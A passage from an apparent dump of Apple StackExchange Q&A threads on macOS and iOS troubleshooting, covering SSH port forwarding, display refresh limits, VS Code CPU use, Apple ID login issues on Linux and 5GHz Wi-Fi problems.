moment.\nYesterday I got the usual notification asking me to perform \"updates\".

Are those 49884 and 49886 are port numbers? Should I open new ports via port forwarding? And most importantly, could you guys explain me how can I connect remotely via ssh in layman terms please?\nB.R.\n\nA: Yes, the numbers 49884 and 49886 you see are indeed port numbers. However, they're not port numbers for the ssh service itself, but are the port numbers these specific clients have used for connecting. The numbers are essentially meaningless for you.\nThe usual problem that home users have with connecting remotely over SSH to their own computer is that their network is behind a NAT (Network Address Translation) router. Essentially this means that your router has a single public IP address, but allows multiple devices behind it to connect to the internet even though they have private IP addresses that are not \"visible\" on the internet.\nThe most common way to enable remote access over SSH is to add a port forward in the router. You'll need to port forward your remote IP port 22 to port 22 on the local IP of your iMac.

I'm connecting an LG 27UD88 external display directly via the supplied USB-C cable, which is also used to provide power to the laptop plus allows the display to act as a hub for USB-A devices.\nThe screen achieves 4K @ 60Hz via the USB-C ports on the left-hand side of the laptop. However, when I connect it via either of the ports on the right-hand side, it maxes out at 30Hz. \nI have tried resetting the PRAM/NVRAM and SMC, and tried the cable in different orientations.\nWhen I option-click Scaling in Display Prefs, the refresh rate is limited to 30Hz with the right-hand ports.\nI have found other questions which describe 60Hz/4K issues with dongles (1, 2, 3), and mention of this left-hand/right-hand disparity on Reddit, but there is nothing concrete about whether this is a universal issue.\nMy question is: is this a fault with this particular unit, or is this a known limitation of all 2018 13\" MacBook Pros?\nUpdate: I have found that it is able to drive another 4K display at 60Hz from the right-hand ports, via a USB-C to DisplayPort cable. I'm wondering if the problem above is associated with the fact that the laptop is also drawing power and USB hub functionality from the LG display.\n\nA: In 2016 and 2017, the left-hand Thunderbolt ports were higher bandwidth than the right-hand ones, and this would be expected behaviour. For 2018 models, all 4 ports should have the same performance.\nSo is it possible that you have a 2017 model without knowing it? If not, then I think this is unexpected behaviour.\n\nA: Same issue here, I bought a 2018MBP 512GB/16GB/I7 version, when I connect to my LG 4K (27UK850) display on the right (using equipped USBC to C cable), it only output 1920*1080 30Hz, the mouse and window is lagging with shadow, it is killing me, while my previous model 2016MBP 512GB/8GB works fine with this display, it can output 60Hz from any of 4 TB3 ports. \nThe fact is they are the same OS as I restored the entire OS using Time Machine. Interesting thing is, I called Apple, the operator said 2018 model has a spec bump on GPU, which requires HDMI 2.0 cable to get 4K 60Hz, she said changing a suitable cable is the only way, and I tried, it really worked, but in that case I need to connect my MBP to power using additional cable, rather than one USB C to C cable nails it all (power, image, audio). \nNow I am connecting to the left side TB3 port just like you, and 40K 60Hz it is, I sent an email to that operator and ask her for an official reply on why same TB3 ports works differently, since I am AC+ user, I think she will get back to me real quick, I will update then. \n", "Q: AppleScript : CMD + S I can't manage to keystroke Command + S on an app, it's seems to trigger \"Save AS\" instead of \"Save\"\n tell application \"TextMate 2\"\n    activate\n\n    tell application \"System Events\"\n        keystroke \"S\" using {command down} \n    end tell\n\n    --\nend tell\n\nI don't have \"shift\" in my keystroke so I don't know why I can just save my documents without any extra windows.\nAny idea of what I'm doing wrong?\n\nA: Use a Lower Case s.\nkeystroke \"s\" using {command down} \n\n", "Q: Can’t click/drag MacOS notifications, which are transparent, have to restart Notification Centre I have this problem on macOS Mojave (10.14.3, but it happened on older versions too)\nNotifications are transparent and non-responsive to click/drag anything.\nSee screenshot: \n\nIf I kill NotificationCentre process it disappears or become \"top-positioned\" element on display so I can drag / click it like I normally would.\nThis usually happens if I disconnect my external display or wake from sleep.\nThanks for help!\n\nA: The only fix officially is to kill the notification center in Terminal with\nkillall NotificationCenter\n\nThis may become inconvenient if you need to do it too often though.\n", "Q: macOS closes all my applications when I lock my screen When I lock my screen with ControlCommandQ and return after more than 10 minutes, macOS has closed all my open apps and tries to restore them, which often leaves my applications in half restored states.\nThis did not happen before.

I am looking for potential ways to make typing on an iPhone easier for other Bluetooth keyboards that were not made by nor for Apple devices.\nI should be running the latest iOS software. \nThe Trouble: For now, after I paired the iPhone with an Always-On Bluetooth keyboard at home, I am forever bound to such keyboard: it won't quit, as the keyboard is powered by a set of AA batteries and there is no switch on it to turn it off, and it won't let me change input method!\nWhat the \"Magic Keyboard\" does when paired with iPhone\nThanks to the integration of Apple products, there are two ways:\n\n\n*\n\n*At the far right corner of the Magic Keyboard, there is a key that can show/hide the on-screen keyboard. One can use this interface to switch input method. \n\n*Moreover, the default \"Mac-OS\" keyboard shortcut still works: holding opt + space shall get me to loop through the input methods\n\n\nYet, I only have bought one pair of Magic Keyboard and have kept it at work. Over the years, I should have a good number of generic Bluetooth keyboards, 2 among which are fancy mechanical switch ones. Unfortunately, they are \"generic Bluetooth keyboards\" ==>\nWhat generic Bluetooth keyboards do? And, can we avoid buying\nWell, when typing, I did not find a way to summon the on-screen keyboard at all. This bans all graphical interface tweaks: there is simply no button to click on. \n\n\n*\n\n*Question 1: Can I devise finger swipes to change input methods? I have only two in total.\n\n\nThen, Alt + space does not register on iPhone. This may have to do with how these generic Bluetooth keyboards are dealing with issuing keystrokes, and I wonder if there is a walk-around? Say:\n\n\n*\n\n*Question 2: Is it possible to define keyboard shortcuts for iPhone to loop through input methods?\n\n*Question 3: Or, can I spare a F1 key if key-combination is not allowed, solely for iOS to change input method.\n\n\nA: The standard way to switch layouts in iOS is always Control plus Space (not Alt/Opt). It should work on arbitrary keyboards with these two keys. \nThere’s no way to change this shortcut in iOS as far as I know.\n", "Q: Network proxy setup in terminal I am trying to create a bash script that will update the mac's proxy settings and a few other places when a user changes their password every 60 days.

I only use Profile Manager (part of MacOS Server) and am struggling to figure out how to do this successfully. I've experimented with   mdmctl to create a .plist file and have applied it by uploading it under Custom Settings but nothing happens on the Mac. I've not been able to find any guides on how to use Custom Settings to deploy these plist files.\n\nA: mdmctl is part of the open source MDM, MicroMDM. As far as my research has gone, Profile Manager does not support the InstallApplication MDM command that enables an admin to deploy packages to clients. If you have mdmctl, then you may have MicroMDM setup already, and you should reference their documentation for deploying apps. See https://github.com/micromdm/micromdm/wiki/Quickstart.\nIf you are just looking to deploy Microsoft Office 2019, you could \"purchase\" the apps for free using VPP and Apple School Manager or Apple Business Manager as a DEP solution. Once you've purchased the apps through the DEP portal, and assuming you've tied Profile Manager to your DEP account, you can then push the apps out. Apple documents what MDMs need to deploy apps, but their own Profile Manager does not support this functionality. I found this page in hopes of getting Profile Manager to deploy a munki package, but I still haven't found anything indicating that it is possible.\n\n\n*\n\n*DEP Starter Page: https://support.apple.com/en-us/HT204142\n\n*Office 2019 in App Store: https://support.office.com/en-us/article/microsoft-office-and-the-mac-app-store-ad2293a8-f5aa-4652-ae3f-83dda906d748\n", "Q: Change width of a column in a table in Notes.app on a Mac I discovered the nifty table feature (rows and columns) available in Notes.app on macOS Mojave.\nHow does one stretch or narrow the width of a column? \n\nA: Like @Benj mentioned you can add spaces to one of the cells and the Notes app will adjust the size of the column accordingly.  It's not ideal but sometimes it helps when you don't want the text to wrap around\n\n\nA: Adding blank spaces to the top row is the fix I found for printing out a few tables I wanted without wrap-around text. It was mentioned that this isn't an ideal solution but it worked fine for adjusting column sizes in my use.\n\nA: I was initially confused that adding space characters to the end of the line did not increase the width of the column as others have said. It turns out that you have to add more space characters than you may assume in order for the column to grow.\nHere is some experimentation with a table cell that I want to be displayed using a single line of text. By adding 20 space characters to the end of the text, the cell/column begins to grow. But it takes 47 space characters to eventually make the cell/column wide enough to fit the cell's text in a single line.\n\n\nA: The rows and columns of Apple Notes's tables should automatically adjust to fit content. There is no control to explicitly set a width or height, apart from adding whitespace to increase text length (not recommended).\n\nA: Adding a newline character within the cell helped to keep the cell content somewhat aligned to a fixed size that I wanted.\nI used OptionReturn on Mac and ShiftEnter on Windows.\n\nA: I’d kite to add to Matt P & others answers. Their descriptions are perfect until Apple improves it. As a refinement, use your top row for column headers to add the spaces in for extra width. (I like to underline & bold this row so I don’t accidentally delete it.) Start with first column header and add spaces at end until column width bumps wider. Keep going if you want it wider. Then go to the next column you want to widen & repeat.\nColumn width starts out as narrow as it gets. Want narrower columns? Then start out with more columns & experiment. I started with 6 columns when I only needed three. I widened the first and third column and left the 2nd, 5th & 6Th alone and they kept their narrower width. I later deleted the 5th and 6th columns and column 2 bumped wider. Not what I wanted. You may have to live with extra columns that you don’t use. Caution: longer data entries in rows below will widen the whole column.  I know, this whole workaround is a pain and I wish Apple should fix it.\n", "Q: How to ensure Time-Machine can rollback to a specific-date backup? (not deleting it) I just upgraded from El Captain to Mojave and I have a Time Machine backup of the instant before starting the upgrade.\nI need to be able to eventually restore the previous operative system, but I am afraid that that backup could be removed in order to make space for newer backups.\nHow can I \"mark it\" and ensure that that specific backup will not be discarded?\n\nA: There is no way of marking a TM snapshot as being particularly important.\nHowever, as long as the TM disk isn't full, then TM should not normally delete the snapshot that accounts for a complete OS change. (Assuming that you had the old OS on your disk for more than 1 month.)\nTM will start deleting the oldest snapshots if the drive is full, to make space for the newest ones. \nIf you want to make absolutely certain, you would do well to use an app like SuperDuper! or CarbonCopyCloner to make a clone disk image, which you can restore at a later time. (But you needed to do this before upgrading.)\nBear in mind that when you roll the whole disk back, you will lose any changes to your data made since the rollback date. IMAP servers will handle changes to email, but documents and other files will need to be restored by other means.\n", "Q: How to turn off the screen without sleep on a MacBook Pro with Touch Bar? Is there any shortcut for it?\nI tried Control + Shift + Touch ID, which didn't work.\n\nA: There are two methods I will explain.\n1. Use the 'Lock display' touch bar shortcut\nIn System Preferences -> Keyboard settings, click 'Customise Touch Bar'. There is a shortcut 'Screen Lock' which you can use to lock the display, as well as 'Sleep' and 'Screen Saver' shortcuts which have their own respective functions.\n2. Leave computer open, but screen turned off\nIf you need to turn off the display, without actually sending the computer to sleep, simply turn the brightness down to the minimum.On an MacBook Pro (Touch Bar) leave brightness at lowest (with slider as left as it can go)\nIf you're comfortable with the terminal, try $ caffeinate -dimsu -p <process-id> for leaving a long process running without sleeping computer, where <process-id> is the PID for the process (you can look this up in Activity Monitor)\n", "Q: Spam on iMessage - What are my options? A person unknown to me got hold of my Apple ID (email) which is registered with iMessage. While as I understand, there should be no harm in some stranger having access to my email address (apart from the possibility of receiving spam emails).\nHowever, what's concerning me is that this person is sending me a truck-load of messages on iMessage. He/She is also constantly trying to reach me via FaceTime Audio/Video.\nI have politely requested them to state the intent of communication. However, the person appears to be engaging in irrelevant chatter.\nAfter repeatedly requesting to stop it, I pulled the plug by blocking the Apple ID. However, the person retaliated by creating a new Apple ID and starting all over again.\nI am quite bothered by the unnecessary communication which I find to be distracting. I have blocked the second Apple ID too and, in response, I have started receiving the communication from a yet another Apple ID.\nWhat official options do I have to stop this? Will reporting the Apple ID(s) in question enable Apple to take actions which can prevent this further?\n\nA: According to Apple: \"If you get an iMessage from someone who's not saved in your Contacts, you'll see a Report Junk link under the message.\" You then have to block the sender if you want to stop getting messages from them. \n\nBut since you are asking the question I'm guessing that isn't showing up. And since the perpetrator is jumping to new Apple IDs every time you block them I don't know how useful it would be. \nIf you do end up seeing the \"Report Junk\" link, maybe use it and don't block them, just mute the thread, reporting it every chance you get?\n\nA: Apple is not currently (or generally, IIRC) a major host of spammers/among The World's Worst Spam Support ISPs.\n", "Q: VS Code - Code Helper process using more than 100% CPU on macOS I noticed that my MacBook gets hot and noisy (fans) when using VS Code (v1.31). The Activity Monitor shows the process Code Helper using more than 100% of CPU. It started happening with one repository which is huge. Only one window opened, no files opened, and it always uses more than 100% CPU.\nChecking in Microsoft/GitHub, there was an issue reported but they closed it saying \"This issue has been closed automatically because it needs more information and has not had recent activity.\" , but it is still an ongoing issue.

There are too many large files in that folder and its cache folder.\n{\n  **/node_modules/**,\n  **/.expo/**\n}\n\n\nA: The behaviour you describe could either be a bug in VS Code or it is intended behaviour simply because the numbers of files you have require large amounts of CPU time to process. I strongly suspect that the problem is a bug.\nThe issue you have found have the same externally observables as your problem, i.e. the CPU usage of Code Helper is very high. However there could be many different reasons for that to happen. Therefore it is not a problem that that specific issue has been closed for outside comments.\nI would highly suggest opening a new issue instead.

Then please describe everything carefully, including which of the recommendations you have tried that did not work.\nHopefully the VSCode team will be able to fix the bug and release a new and fixed version.\n\nA: This is most likely an issue with a plugin in VS Code. For me, it was Pyright.\nHow to check?\n\n\n*\n\n*Open Activity Monitor\n\n*Within the list of prcesses, find the one that has the highest CPU usage (it should already be at the top).\n\n*For this process, find the PID number.\n\n*Then, within terminal, type this:\nps aux | grep 20295\n\n*note that you should change \"20295\" to the PID number that you found in step 3\nThis should give you the information as to which extension it is. I, personally, would remove it, but that's up to you. At the very least, please contact the maintainer of that package and make sure that they are aware of the issue.\nAfter removing the extension, exit VS Code, wait for a bit while the fans slow down and then start again. It shouldn't give you a problem now.\nHappy coding!\n\nA: In my case it was Settings Sync v3.4.3. Once i disabled it, the problem is gone !\n\nA: I have a markdown file within LaTeX which caused the Code Helper process to consume 100% of CPU resources.\nI checked the extensions and noticed that, when I disable the Markdown+Math extension, CPU usage goes down immediately.\nI use the Markdown+Math extension to preview markdown files within LaTeX. I uninstalled the extension, and use now \"Markdown Preview Enhanced\".\n\nA: I tried stable VSCode and insiders VSCode on the absolute same project and same extensions.\nThe CPU hurt happens only in stable build and not in insiders.\nI have to sometimes use the stable build because some features break in the insiders from time to time.\nThis is something already fixed in Insiders but is not being pushed to stable. It's been annoying me for months.\n\nA: For those arriving in 2022, the newer versions of yarn have a local cache of all of the packages, which should be excluded.\nThis worked for me as a project file .vscode/settings.json\n{\n  \"files.exclude\": {\n    \"**/.yarn/cache\": true\n  },\n  \"files.watcherExclude\": {\n    \"**/.yarn/cache/**\": true\n  }\n}\n\n\n\nA: It might be one of your installed extensions.\nIn my case, it was code-spell-checker.\nSo it you are having it too, as others, I suggesting disabling extensions, one by one, until you find the problematic one.\nIn the case of Spell Checker, it seems to be affecting projects with large files, so excluding tmps, logs, etc, from view/search might not be enough if you do have large files with code.\n", "Q: Apple ID page blocking Linux computers Apple ID sign-in is not working from Linux OS browser (Chrome, Firefox...tried both with new session cookies cleared, and incognito). I can browse apple.com without issues. I needed to check Apple ID after getting what appears to be a bogus security alert on my iPhone about a FaceTime sign-in on my table. \nI've tried to login to Apple ID page from 3 different public IP addresses (cities) and Linux based desktop & laptop computers with latest updates. Login works fine from a Windows computer.\nI spoke with Apple Support and they said:\n\nwe are only trained on Apple products so we are unable to help you with that.\n\nWhen they said they could escalate it to one of the engineering teams and get back to me, I offered to give the Chrome and Firefox versions along with the OS information and again I was told:\n\nwe are only trained on Apple products. That information will not likely be useful to our team. \n\nI can't imagine telling one of my customers that when questioned about a cross-platform compatible product/service I provide. It's specifically a bad gateway reported by Apple server and only happens when trying to connect from a Linux computer.\n\nThis has never been a problem for me in the past. I figure since the error is reported directly from Apple servers, they made a change in their firewall. I'm not sure what else to try with Apple Support. How do you resolve this?\n\nA: The best way would be simply to follow the instructions you were given by Apple Support - namely to let them escalate the issue to engineering. Engineering will then likely ask you for Chrome/Firefox versions if that is at all relevant to the problem - right now it doesn't seem likely that the versions numbers have are important.\nUsually these errors are an intermittent issue. I.e. an outage that is typically fixed in a short while. It could also be triggered by something in your system, so you might try for example clearing cookies and reloading the page.\nIt is not a general issue with using Linux browsers to connect with apple.com. Many do that every day without problems. It might be specific to appleid.apple.com - you could confirm that by trying to load www.apple.com. If so you can use the user-agent feature of your browser to hide the fact that you're using a specific browser on a specific OS.\n\nA: The response from this user post in a related question was helpful. Specifically, apple is blocking the default user-agent string from Chrome and Firefox on Linux (at least Ubuntu based) computers. To confirm this, I did the following.\nChange useragent on Chrome:\n\n\n*\n\n*CTRL + SHIFT + I to open Chrome developer tools.\n\n*Click the 3 dots in the bottom right of Chrome developer tools:\n\n\n*Go to More tools > Network conditions\n\n*Scroll down to User agent and un-check Select automatically\n\n*Enter the following string Mozilla/5.0 (Macintosh; U; PPC Mac OS X;\nfi-fi) AppleWebKit/420+ (KHTML, like Gecko) Safari/419.3\n\n*Enter the following in your browser https://appleid.apple.com\nChange useragent on Firefox:\n\n\n*\n\n*Enter about:config in the URL field and press enter (and accept\nrisk warning).\n\n*Enter useragent and press enter.\n\n*Look for general.useragent.override \n\n\n*\n\n*If you see it, right click it and select Modify and go to step 4.\n\n*If you don't see it, right click in empty area of page and choose New > String and then enter general.useragent.override as name and go to step 4.\n\n\n*Enter Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fi-fi) AppleWebKit/420+ (KHTML, like Gecko) Safari/419.3 as value\n\n*Enter the following in your browser https://appleid.apple.com\nAnother way to test this in Chrome in Linux is follow steps 1-4 for Chrome useragent change. Next, instead of entering the example string above, select another useragent (Safari - Mac, Chrome - Mac, Chrome - Windows, etc) from the list. All those useragent's allow access to https://appleid.apple.com from Linux. \nChrome on Windows 10 doesn't have a Linux option to choose from, so to test this from Windows, you can enter one of the following strings I pulled from a Linux machine with the latest updates:\nChrome/Linux\nMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36\nFirefox/Linux\nMozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\nIn my test this morning from a Windows 10 computer, using those useragent's in Chrome, attempts to https://appleid.apple.com resulted in a 502 bad Gateway.  That same test should work from a Mac but I don't have mine with me.\nTest from Windows 10:\n\nSome information about browser detection.\n", "Q: Keyboard shortcut to select the address bar for the current page in Safari?

But sometimes I want to replace it with the new page. Sometimes I can get back to the address bar by pressing Tab or Shift + Tab several times, but the number of times depends on the amount of tab-selectable fields on the page.\nIs there a keyboard shortcut to select the address bar for the current page in Safari?\n\nA: Command + L is the keyboard shortcut you are looking for.\nThis shortcut is corresponding to Open Location... command which can be found under File → Open Location... in Safari Menu bar.\n", "Q: Stop Safari from opening FaceTime when a site contains a phone number When navigating with Safari to some sites that have phone numbers, Safari diligently opens FaceTime when I click on a phone number. Is there a way to prevent this? \nI am currently tempted to delete the FaceTime app from the Applications folder, but I hope there is a less drastic way to do this.\nmore info : Both Chrome and Firefox propose the option to 'open FT' or cancel. I was looking for a similar setting in Safari.\n\nA: I'm not 100% certain on this\n\nIf you uncheck \"Calls from iPhone\"\n\nin FaceTime Preferences, this should stop happening. \n", "Q: Preview shortcuts to select editor tabs by index I am trying to switch rapidly back and forth between two related Preview tabs (different versions of a research paper). In other applications I would do this by selecting Command-[TabNumber]  e.g. Command-3 then Command-4 then back to Command-3.  \nWhat is the equivalent in Preview?  I did look at the help https://support.apple.com/guide/preview/preview-keyboard-shortcuts-on-mac-cpprvw0003/mac\n and also just tried a number of combinations without luck.\n\nA: In Preview you can do the following:\n\n\n*\n\n*Open the two documents in their windows;\n\n*Go to menu Window and click on \"Merge All Windows\"; this will merge the windows into tabs inside Preview.\n\n*Now you are ready to switch between tabs with Ctrl+Tab to go to next tab, or with Ctrl+Shift+Tab for previous tab. \n\n", "Q: My Ipad 2 does not want to charge: how should i fix it? My Ipad is very old but still works well, the only thing it does not work is charging issue. The original charger was damaged, and I have replaced it with a accessory for it. Later on, when I want to charge, instead of charging it does the opposite of charging while having plugged in. And this is really weird, because before it did not happebed this. \nSo, how should I deal with charging mal function? I have tried to reboot, but it did not worked. I have tried to look for the answer but its unclear, because it is not the answer I was looking for..\n\nA: Your question is a little vague but we can make a few suggestions based on what it could be.\n\n\n*\n\n*Replace the charger and cable with a new charger and cable. If the charger went bad (and a cable could masquerade as a bad charger) replacing it (or testing it) with a new one of each should narrow down the problem.\n\n*I don't know what \"the opposite of charging\" means. But if the iPad powers off when you unplug it I would think item one above isn't gonna help as the charger/cable are providing power to the iPad. That might indicate a bad/worn out battery.\n\n\nNote that the indication that it might be other than the battery (replace the lightning port or logic board) is possible. \nHonestly I would take it to a trusted independent service center and see what they say.\n", "Q: Disable Apple FaceTime Camera kernel module One day my FaceTime Camera stopped working, so I decided to reboot my MacBook. After waiting hours, MacOS didn't complete the boot process.\nIn verbose mode ⌘+V, I can see initialization hangs with what I assume to be loading of a kernel module:\nAppleCamIn::init\nAppleCamIn::probe\nAppleCamIn::start\n\nI took my Mac to an Apple store where hardware testing didn't show any issues (although I don't think the diagnostic tests check the camera) and they reinstalled Mojave. The problem still persists. I can still boot into single user mode ⌘+S to mount volumes, perform fsck, etc. and I have been using my Mac in \"Safe Boot\" for over a week now.\nSeveral questions:\n\n\n*\n\n*Has anyone seen this type of issue before?\n\n*How do I unload this specific kernel module?\n\n*If this doesn't fix my issue, how can I further diagnose the difference between being able to boot in \"Safe Mode\" versus a normal boot?\n\n\nA: I have not seen this specific issue before, nor do I think it is common in any way.\nWhat you really want is not to unload the kernel module (which is the term used to describe removing the kernel extension from memory after it has already been loaded and initialized) - instead you want to \"disable\" or \"remove\" it.\nYou can do this by opening the /System/Library/Extensions/ folder and then move away the AppleCameraInterface.kext file. Move it for example to a folder you have created in your user folder. I suggest moving instead of deleting as it is then easier to rollback this change. You can do the move using either Terminal or Finder.\nYou might need to boot in Recovery Mode in order to move the file, if you're not allowed to do so in Safe Boot.\n", "Q: Is there a way to entirely remove the Messages app from an iOS 12 device? I'm trying to set up an iPad for a child and don't want any Messages app at all. Apple seems to want to keep it there. Any way to completely remove it? \n\nA: iOS 12 does not seem to allow Messages to be turned off. But this method should prevent messages from working.\nSettings > Content & Privacy Restrictions\nAnd set Account Changes to Don't Allow and password protect that setting by turning Content & Privacy Restrictions on at the top of that screen. She will not be able to add an account (EG iCloud/AppleID) that would allow iMessage to get messages. \nNote that a clever and determined child will often find workarounds to anything and could easily find a web-based messaging service available via Safari.\n", "Q: Monitor Folder Contents with launchd - Including Subfolders? I want to make a shell script that runs any time the contents of a particular folder on my server are changed. Seems easy enough at first, because launchd has a directive called WatchPaths which triggers your script any time the contents of a folder change.\nHOWEVER WatchPaths is not triggered by changes in subfolders. The folder I'm trying to watch is a few hundred MB of small web files, nested several levels deep in sub folders. Far too many folders to try to manually list each one.\nIs there some other sane way to accomplish this? \n\nA: WatchPaths doesn't appear to be able to watch a sub-directory recursively, so the best you can do with it is watch a single directory's activities. You might want to take a look at Folder Actions, they're discussed in detail in this blog post titled: Setup OS X Folder Actions to Know When a File is Added as well.\nAnother alternative is to use a CLI tool that's available in Homebrew via the brew install fswatch command. fswatch is a cross platform implementation that works on most flavors of *NIX includes macOS.\n\nThe FSEvents monitor, available only on OS X, has no known\n  limitations, and scales very well with the number of files being\n  observed.\n\nExample\nHere I've created a sub-directory called ~/somedir. I then invoked `fswatch against  this directory:\n$ mkdir ~/somedir\n$ fswatch /some/dir\n\nNow if we start adding files and sub-directories fswatch will notify:\n$ touch ~/somedir/afile\nfwatch msg>> /Users/joeuser/somedir/afile\n\n$ mkdir ~/somedir/anotherdir\nfswatch msg>> /Users/joeuser/somedir/anotherdir\n\n$ touch ~/somedir/anotherdir/afile\nfswatch msg>> /Users/joeuser/somedir/anotherdir/afile\n\nThe above can be adapted for use in a shell script which can take whatever other actions you require when any changes are detected against the directory tree that fswatch is monitoring.\nOther Examples\nTo act on file system activity you can use one of these 2 patterns:\n$ fswatch -0 path | while read -d \"\" event \\\n  do \\\n    // do something with ${event}\n  done\n\nOr this:\n$ fswatch -o path | xargs -n1 -I{} program\n\nReferences\n\n\n*\n\n*fswatch\n\n*Is there a command like “watch” or “inotifywait” on the Mac?\n\n", "Q: Mac keeps creashing

ran the hardware diagnostic (Hold D on restart) and it found no issues\n\nA: Seeing as a kernel panic is mainly caused by third party kernel extensions and you seem to have com.joshuawise.kexts.HoRNDIS which is for android tethering, I would suggest you start in recovery mode and disable that one. You will need to install the latest version of that if you use it, I guess.\nHow did I find out ? In kernel panic messages, all kext (kernel extensions, drivers) are listed. I looked for non-Apple extensions and you seem to have 3:\ncom.intel.kext.intelhaxm    6.2.1 <---OK, intel should be fine\ncom.nvidia.CUDA 1.1.0             <---OK, NVidia should be fine\ncom.joshuawise.kexts.HoRNDIS    6\n\n\nA: You stated that your laptop started to do this randomly as of late?\nWas it after you upgraded to Mojave? Did you recently spill anything on the computer? Or was it dropped in any way?\nWhat kind of peripherals do you have connected to the Mac? Did you change anything inside the Mac?\nIs your computer overheating? Are you running a lot of labor intensive read/write operations?\nAlso take a look at this line in your report:\n\nBSD process name corresponding to current thread: sysmond\n\nThis is telling you that the sysmond service was the last thing running before it went into kernel panic. This is the system monitor daemon. It probably is hogging up a lot of CPU, which has been known to happen in older OS's. It's possible that is the source of your issue.\nI would check for the more obvious signs first like the ones I stated, and then if it comes down to it, do the following:\n\n\n*\n\n*First do an NVRAM reset\n\n*If above didn't work, do a clean Mojave install.\n\n*If that doesn't work either, take to Apple.\n\n\nYou might have nothing connected to the computer, and there is no third party kernel extension running, so this could point to a hardware issue, and might need to be taken back to Apple.\n", "Q: Using Google Chrome on macOS to run Windows executable (.EXE files) My students write code in Lazarus IDE on PC running Windows 7, using Pascal programming language, and get a .exe file as their final product.\nIs there a way to open these files within Google Chrome running on macOS? I read a bit about NPAPI (now discontinued) and Simple-Get, but I'm not sure either does the trick.\nOn a Windows PC, it's simple. I download the .exe from the dropbox where the students have submitted it to me, then open the download, and everything is right there ready for my keyboard input.\nOn my school-issued Mac, I'm disabled from downloading software for local installation. Thus, I'm looking for a way to make this all happen within Google Chrome as an extension or add-on.\nUltimately, I need to download the file (.exe) then open that downloaded file in Google Chrome (in a somewhat efficient way that allows me to look at probably 50 or so programs in 30 minutes).\nLayman's terms certainly appreciated where possible, I have a definite language gap!\n\nA: No, you can't run exe's via Google Chrome. You may be able to use some sort of remote desktop solution such as Chrome Remote Desktop, whereby you install the exe on a Windows computer which you can see and control from your Mac—but that's not quite the same thing.\nThere are a number of solutions for running Windows executables on a Mac, each with their own set of compromises:\n\n\n*\n\n*Wineskin / Wine. Works perfectly with a minority of Windows programs, but doesn't work at all with others. When it does work, this is the best solution by far.\n\n*Bootcamp Assistant, which is preinstalled on every Intel Mac in the Applications → Utilities folder, will guide you through the process of installing Windows on a separate partition. Once done, you will be able to reboot your computer into Windows—effectively turning it into a PC, temporarily—and reboot again to return to macOS. Note that this will require a purchased copy of Windows. While rebooting is a pain, this is the most \"no compromise\" solution, in that every Windows app will work and you won't loose any performance.\n\n*Virtualization software such as Virtualbox (free) or Parallels (paid, and expensive). Like Bootcamp, but you'll be able to switch to Windows without rebooting your computer. The catch is that you lose performance—applications will run considerably more slowly than normal. Note that the performance loss is much worse in Virtualbox than in Parallels—you get what you pay for, in this respect.\nThe problem is that all of these solutions requires either additional third party software (1, 3) or administrator privileges (2). I don't know your situation, but it seems to me that you need to have a discussion with a supervisor or similar about obtaining the resources and privileges necessary to do your job.\n", "Q: iCloud / iOS / Mac Syncing Troubles I have an iPhone 7 running iOS 12.1.4, and a MacBook Pro running OS 10.13.6. I am running iCloud using the same ID, syncing contacts from both devices. This should sync seamlessly, but it doesn't. I have duplicates on the Mac, and the iPhone; contacts that appear on the Mac, and not the iPhone; and contacts that appear on the iPhone, and not the Mac. I want to merge the two databases into iCloud, and eliminate duplicates. I have tried logging out of iCloud on both devices, waiting 30 minutes, and re-connecting. I still have the same issue. Any suggestions as to how I can get my contacts in sync in all three locations would be greatly appreciated.\n\nA: To remove duplicate contacts:\n\n  \n*\n  \n*Make a copy of your contacts.\n  \n*Open Contacts.\n  \n*From the Card menu, select Card > Look for Duplicates.\n  \n*When asked, click Merge.\n  \n*Repeat steps 2 and 3 until no duplicates are found.\n  \n*Make another copy of your iCloud Contacts.\n\n\n\n*\n\n*https://support.apple.com/en-us/HT203565\nThen sync those contacts to iCloud. \nAfterwards, turn off contacts on the iPhone in iCloud settings, \nremove all remaining contacts and turn it on again.\n", "Q: Way to temporarily disable badge notifications while using iPhone?

The critical part related to your issue is the \"dual-band\" WiFi; it uses two different radios, not one.  So, it's completely plausible that one radio has failed (5GHz) while the other (2.4GHz) continues to function; this is what you're seeing.\n\nImage from iFixit.com\nTo verify that it's not a software issue, you should boot into Safe Mode (hold ⇧ Shift) and/or Recovery Mode (⌘ Command R).  If the problem persists, it's a hardware issue. \nYou'll just need a replacement AirPort adapter which is fairly inexpensive.  It's also a fairly straight forward fix, basically remove the back cover, disconnect the Wi-Fi and Bluetooth antenna, then remove the AirPort card. Replace with the new one and reverse the procedure to reassemble everything.  iFixit.com has an excellent step-by-step guide you can follow.\nHowever, if opening the back of your Mac is not your cup of tea, let a professional handle it for you. \n\nA: For my case, I changed the 5Ghz Authentication method to WPA2PSK and it worked like a charm.\n\nA: My iMac late 2012 wasn't connecting to the new 5Ghz 802.11/ac router, so I followed along Allan's answer and bought a new Airport Card. The problem remained.\nThe real issue was that when i setup my router as Access Point it doesn't show options for  wifi mode(802.11a/b/g/n/ac).\nMy iMac can only do 802.11a/b/g/n, and I can't connect to the 5Ghz because the router it's only doing 802.11ac instead of what I was expecting to be 802.11n/ac mixed.\nSo, before buying a new airport card, try changing the router mode and broadcasting channel to your Mac's supported. (About this Mac->System Report->Network->Wifi->Supported PHY Modes & Supported Channels)\nMy solution was buying a 802.11ac wifi usb adapter and enjoy the faster speeds.\n\nA: Sorry to answer again the same question but the channel was the issue on my 2012 (and several other) macbooks as well. go 48 or lower for the 5Ghz network. Cameron is correct.\n\nA: Hey for anyone who can't see 5G on their MBP like me (mine is mid 2012) try setting the channel on the router to a channel that is supported by your mac.\nThis is usually in the advanced tab/field when you log into your router.\nTo see what channels your mac supports go to:\nAbout this mac > System report > WiFi\nThere you will see supported channels. If you're in an apartment block try select one without much traffic, you can do this by holding the alt key and clicking your wifi in the top bar and hovering over your neighbours wifi names to see what channels theyre using.\n\nA: I experienced this issue when I got a new Router. So at first when I turned on the Router, my MacBook Pro could see the 5.0Ghz network and the 2.4Ghz network. After, I modified some settings for the Router like updating the name of the 5.0Ghz network and the 2.4Ghz network from the default names to my preferred name, I could no longer see the 5.0Ghz network, however, the 2.4Ghz network was still visible under my MacBook Pro list of networks.\nI tried restarting the Router multiple times but I still couldn't see the 5.0Ghz network under my MacBook Pro list of networks. I tried 